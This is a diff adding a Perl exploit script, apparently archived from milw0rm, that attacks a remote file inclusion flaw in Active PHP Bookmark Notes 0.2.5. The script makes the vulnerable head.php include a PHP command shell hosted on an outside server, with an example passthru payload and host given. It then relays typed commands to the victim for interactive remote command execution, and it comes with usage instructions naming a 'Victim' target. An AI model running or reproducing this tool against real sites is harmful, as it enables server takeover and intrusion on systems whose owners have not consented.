@@ -1,0 +1,76 @@
+#!/usr/bin/perl
+# Active PHP Bookmark Notes 0.2.5 <= Remote  File Inclusion Exploit
+# Download S: http://sourceforge.net/projects/apbn/
+# Discovered & Coded by: GloD_M = [Mahmood_ali]
+# perl GloD.pl <target> <cmd shell location> <cmd shell variable>
+# cmd shell example: <?passthru($_GET[cmd]);?>
+# Ex:
+# http://localhost/apbn/templates/head.php?APB_SETTINGS[template_path]=http://localhost/tryag.txt
+# Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group
+##
+
+use LWP::UserAgent;
+
+$Path = $ARGV[0];
+$Pathtocmd = $ARGV[1];
+$cmdv = $ARGV[2];
+
+if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
+
+head();
+
+while()
+{
+      print "[shell] \$";
+while(<STDIN>)
+      {
+              $cmd=$_;
+              chomp($cmd);
+
+$xpl = LWP::UserAgent->new() or die;
+$req = HTTP::Request->new(GET =>$Path.'templates/head.php?APB_SETTINGS[template_path]='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
+
+$res = $xpl->request($req);
+$return = $res->content;
+$return =~ tr/[\n]/[....]/;
+
+if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
+
+elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
+      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
+elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
+
+if($return =~ /(.*)/)
+
+
+{
+      $finreturn = $1;
+      $finreturn=~ tr/[....]/[\n]/;
+      print "\r\n$finreturn\n\r";
+      last;
+}
+
+else {print "[shell] \$";}}}last;
+
+sub head()
+ {
+ print "\n============================================================================\r\n";
+ print " *  Active PHP Bookmark Notes 0.2.5 <= Remote  File Inclusion Exploit  *\r\n";
+ print "============================================================================\r\n";
+ }
+sub usage()
+ {
+ head();
+ print " Usage: perl Gold.pl <Victim> <Cmd Shell Location> <Cmd Shell Variable>\r\n\n";
+ print " <Site> - Full path to example: http://www.site.com/ \r\n";
+ print " <cmd shell> - Path to Cmd Shell e.g http://spy-art.com/xx.txt? \r\n";
+ print " <cmd variable> - Command Variable Used In Php Shell \r\n";
+ print "============================================================================\r\n";
+ print "                             By Mahmood_ali \r\n";
+ print "                            HackEr_(at)w(dot)cN \r\n";
+ print "          Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group \r\n";
+ print "============================================================================\r\n";
+ exit();
+ }
+
+# milw0rm.com [2007-03-17]
